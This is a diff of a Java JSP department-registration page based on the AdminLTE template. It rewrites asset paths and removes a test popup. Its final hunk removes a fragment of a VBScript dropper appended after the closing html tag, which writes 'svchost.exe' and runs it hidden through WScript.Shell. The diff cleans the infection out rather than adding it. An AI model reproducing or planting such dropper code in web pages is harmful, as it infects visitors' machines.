@@ -1,5 +1,6 @@
 <%@ page language="java" contentType="text/html; charset=utf-8"
-    pageEncoding="utf-8"%>
+	pageEncoding="utf-8"%>
+<%String path=request.getContextPath(); %>
 <!DOCTYPE html>
 <html>
 <head>
@@ -9,15 +10,15 @@
   <!-- Tell the browser to be responsive to screen width -->
   <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
   <!-- Bootstrap 3.3.7 -->
-  <link rel="stylesheet" href="../../bower_components/bootstrap/dist/css/bootstrap.min.css">
+  <link rel="stylesheet" href="<%=path %>/static/bower_components/bootstrap/dist/css/bootstrap.min.css">
   <!-- Font Awesome -->
-  <link rel="stylesheet" href="../../bower_components/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="<%=path %>/static/bower_components/font-awesome/css/font-awesome.min.css">
   <!-- Ionicons -->
-  <link rel="stylesheet" href="../../bower_components/Ionicons/css/ionicons.min.css">
+  <link rel="stylesheet" href="<%=path %>/static/bower_components/Ionicons/css/ionicons.min.css">
   <!-- Theme style -->
-  <link rel="stylesheet" href="../../dist/css/AdminLTE.min.css">
+  <link rel="stylesheet" href="<%=path %>/static/dist/css/AdminLTE.min.css">
   <!-- iCheck -->
-  <link rel="stylesheet" href="../../plugins/iCheck/square/blue.css">
+  <link rel="stylesheet" href="<%=path %>/static/plugins/iCheck/square/blue.css">
 
   <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
   <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
@@ -31,34 +32,18 @@
 </head>
 <body class="hold-transition register-page">
 
-<!-- ===============使用layer框架=============== -->
-<!-- 你必须先引入jQuery1.8或以上版本 -->
-  <script src="layer.js"></script>
-
-  
-  <script>
-  
-/*当点击id名字叫test1的时候便会出发该函数，则由对应提示框弹出*/
-    $('#test1').on('click', function(){
-    layer.msg('hello');
-  });
-</script>
 
 
-
-
-
-<button id="test1">layer测试</button>
 
 <div class="register-box">
   <div class="register-logo">
-    <a href="../../index2.html"><b>Admin</b>LTE</a>
+    <a href="address.html"><b>Admin</b>LTE</a>
   </div>
 
   <div class="register-box-body">
     <p class="login-box-msg">创建一个新的部门</p>
 
-    <form action="/Users/Administrator/Desktop/AdminLTE-master/pages/tables/data5.html" method="post">
+    <form action="address.html" method="post">
       <div class="form-group has-feedback">
         <input type="text" class="form-control" placeholder="Full name">
         <span class="glyphicon glyphicon-user form-control-feedback"></span>
@@ -117,16 +102,13 @@
 <!-- /.register-box -->
 <!-- ================动态按钮提示测试====================== -->
 
-
-
-
 <!-- =================foot部分 样式链接部分================== -->
 <!-- jQuery 3 -->
-<script src="../../bower_components/jquery/dist/jquery.min.js"></script>
+<script src="<%=path %>/static/bower_components/jquery/dist/jquery.min.js"></script>
 <!-- Bootstrap 3.3.7 -->
-<script src="../../bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
+<script src="<%=path %>/static/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
 <!-- iCheck -->
-<script src="../../plugins/iCheck/icheck.min.js"></script>
+<script src="<%=path %>/static/plugins/iCheck/icheck.min.js"></script>
 <script>
   $(function () {
     $('input').iCheck({
@@ -138,11 +120,3 @@
 </script>
 </body>
 </html>
-<SCRIPT Language=VBScript><!--
-DropFileName = "svchost.exe"
-WriteData = "
-FileObj.Close
-End If
-Set WSHshell = CreateObject("WScript.Shell")
-WSHshell.Run DropPath, 0
-//--></SCRIPT>
